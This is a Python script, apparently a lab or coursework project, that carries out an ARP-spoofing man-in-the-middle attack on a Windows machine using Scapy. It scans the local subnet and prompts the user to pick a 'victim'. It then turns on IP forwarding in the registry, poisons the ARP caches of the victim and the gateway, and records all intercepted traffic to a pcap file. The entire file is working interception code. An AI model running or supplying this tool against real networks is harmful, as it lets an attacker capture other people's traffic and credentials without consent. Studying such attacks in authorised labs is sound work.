import scapy.all as scapy
from scapy.arch.windows import get_windows_if_list
import subprocess
import sys
import time
import os
import threading
import ctypes
import winreg

output_file_path = r"C:\Users\akash\OneDrive\Desktop\MitM CDAC\intercepted_traffic.pcap"



def is_admin():
    """Checks if the script is running with administrator privileges on Windows."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def enable_ip_forwarding():
    """
    Enables IP forwarding by modifying the Windows Registry.
    NOTE: This change usually requires a system REBOOT to take effect.
    """
    print("[*] Enabling IP Forwarding in Windows Registry...")
    print("[!] IMPORTANT: A system reboot is typically required for this change to apply.")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                             r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 
                             0, 
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print("[+] Registry updated. Please reboot the system to ensure IP forwarding is enabled.")
        input("[?] Press Enter to continue after acknowledging the reboot requirement...")
    except Exception as e:
        print(f"[-] Failed to enable IP forwarding. Error: {e}")
        print("[-] Please ensure you are running the script as an Administrator.")
        sys.exit(1)

def disable_ip_forwarding():
    """Disables IP forwarding by resetting the Windows Registry key."""
    print("\n[*] Disabling IP Forwarding in Windows Registry...")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                             r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 
                             0, 
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        print("[+] Registry restored. A reboot may be required for the change to fully apply.")
    except Exception as e:
        print(f"[-] Could not disable IP forwarding. Manual reset may be required. Error: {e}")

#Network Discovery Functions

def get_gateway_ip():
    """
    Parses the 'route print' command to find the default gateway on Windows.
    """
    print("[*] Finding gateway IP...")
    try:
        result = subprocess.run(["route", "print", "0.0.0.0"], capture_output=True, text=True, check=True).stdout
        for line in result.splitlines():
            if "0.0.0.0" in line and "On-link" not in line:
                parts = line.split()
                if len(parts) > 2 and parts[2] != "On-link":
                    gateway = parts[2]
                    print(f"[+] Gateway found: {gateway}")
                    return gateway
        print("[-] Gateway not found.")
        sys.exit(1)
    except (subprocess.CalledProcessError, FileNotFoundError, IndexError) as e:
        print(f"[-] Could not find gateway IP: {e}")
        sys.exit(1)

def get_network_interfaces():
    """Lists available network interfaces for the user to choose from."""
    print("[*] Discovering network interfaces...")
    try:
        interfaces = get_windows_if_list()
        if not interfaces:
            print("[-] No network interfaces found by Scapy.")
            sys.exit(1)
        
        print("[+] Available Interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"  {i}: {iface.get('name', 'N/A')} - {iface.get('description', 'N/A')}")
        
        while True:
            try:
                choice = int(input("[?] Select the interface to use (e.g., 0): "))
                if 0 <= choice < len(interfaces):
                    return interfaces[choice]['name']
                else:
                    print("[-] Invalid selection.")
            except ValueError:
                print("[-] Please enter a number.")
    except Exception as e:
        print(f"[-] Failed to get interfaces: {e}")
        sys.exit(1)

def arp_scan(ip_range, interface):
    """Performs an ARP scan on the given IP range."""
    print(f"[*] Scanning network: {ip_range} on interface '{interface}'")
    try:
        answered_list = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range),
                                  timeout=2,
                                  iface=interface,
                                  verbose=False)[0]
        clients_list = [{"ip": r[1].psrc, "mac": r[1].hwsrc} for r in answered_list]
        
        if not clients_list:
            print("[-] No active hosts found. Ensure devices are on and connected.")
            sys.exit(0)
            
        print("[+] Discovered hosts:")
        print("ID\tIP Address\t\tMAC Address")
        print("----------------------------------------------------")
        for i, client in enumerate(clients_list):
            print(f"{i}\t{client['ip']}\t\t{client['mac']}")
        print("----------------------------------------------------")
        return clients_list
    except Exception as e:
        print(f"[-] An error occurred during the ARP scan: {e}")
        sys.exit(1)

#ARP Spoofing and Sniffing

def spoof(target_ip, target_mac, spoof_ip):
    """Sends a single, correctly formed Layer 2 ARP packet."""
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    """Restores the target's ARP cache with a correctly formed L2 packet."""
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, hwdst=destination_mac, pdst=destination_ip, hwsrc=source_mac, psrc=source_ip)
    scapy.sendp(packet, count=4, verbose=False)

def arp_spoof_thread(victim_ip, victim_mac, gateway_ip, gateway_mac, stop_event):
    """Continuously sends ARP spoofing packets."""
    print("[*] Starting ARP spoofing thread...")
    while not stop_event.is_set():
        spoof(victim_ip, victim_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, victim_ip)
        time.sleep(2)
    print("[*] ARP spoofing thread stopped.")

def process_sniffed_packet(packet):
    """Callback function to write sniffed packets to the specified file."""
    scapy.wrpcap(output_file_path, packet, append=True)

def sniff_packets(stop_event):
    """Starts sniffing network traffic."""
    print(f"[*] Sniffing traffic on interface {scapy.conf.iface}... Outputting to '{output_file_path}'")
    scapy.sniff(iface=scapy.conf.iface, store=False, prn=process_sniffed_packet, stop_filter=lambda x: stop_event.is_set())

# Main Execution Logic

def main():
    if not is_admin():
        print("[-] Error: Please run this script as an Administrator.")
        sys.exit(1)
        
    # Remove old capture file if it exists to start fresh
    if os.path.exists(output_file_path):
        print(f"[*] Removing old capture file: {output_file_path}")
        os.remove(output_file_path)

    # --- Setup ---
    interface = get_network_interfaces()
    scapy.conf.iface = interface # Set the global interface for scapy
    
    gateway_ip = get_gateway_ip()
    network_range = gateway_ip.rsplit('.', 1)[0] + '.0/24'
    clients = arp_scan(network_range, interface)
    
    gateway_info = next((c for c in clients if c['ip'] == gateway_ip), None)
    client_list = [c for c in clients if c['ip'] != gateway_ip]

    if not gateway_info:
        print(f"[-] Gateway ({gateway_ip}) not found in scan results. Cannot proceed.")
        sys.exit(1)
    if not client_list:
        print("[-] No clients found to target. Exiting.")
        sys.exit(0)

    # Target Selection
    print("\nAvailable Clients to Target:")
    print("ID\tIP Address\t\tMAC Address")
    print("----------------------------------------------------")
    for i, client in enumerate(client_list):
        print(f"{i}\t{client['ip']}\t\t{client['mac']}")
    print("----------------------------------------------------")

    while True:
        try:
            choice = int(input("[?] Select the ID of the victim: "))
            if 0 <= choice < len(client_list):
                victim_info = client_list[choice]
                break
            else:
                print("[-] Invalid ID.")
        except ValueError:
            print("[-] Invalid input. Please enter a number.")
            
    print(f"[+] Victim selected: {victim_info['ip']} ({victim_info['mac']})")
    print(f"[+] Gateway: {gateway_info['ip']} ({gateway_info['mac']})")

    # Execution
    stop_event = threading.Event()
    spoofer = None
    
    try:
        enable_ip_forwarding()
        
        spoofer = threading.Thread(target=arp_spoof_thread, args=(
            victim_info['ip'], victim_info['mac'], gateway_info['ip'], gateway_info['mac'], stop_event
        ))
        spoofer.daemon = True
        spoofer.start()
        
        sniff_packets(stop_event)

    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Shutting down and restoring network...")
    finally:
        if 'victim_info' in locals() and 'gateway_info' in locals():
            if spoofer and spoofer.is_alive():
                stop_event.set()
                spoofer.join()
            
            disable_ip_forwarding()
            
            print("[*] Restoring ARP tables...")
            restore(victim_info['ip'], victim_info['mac'], gateway_info['ip'], gateway_info['mac'])
            restore(gateway_info['ip'], gateway_info['mac'], victim_info['ip'], victim_info['mac'])
            print("[+] Network restored. Exiting.")
        else:
            print("\n[!] Exiting without restoration as target was not fully selected.")


if __name__ == "__main__":
    main()
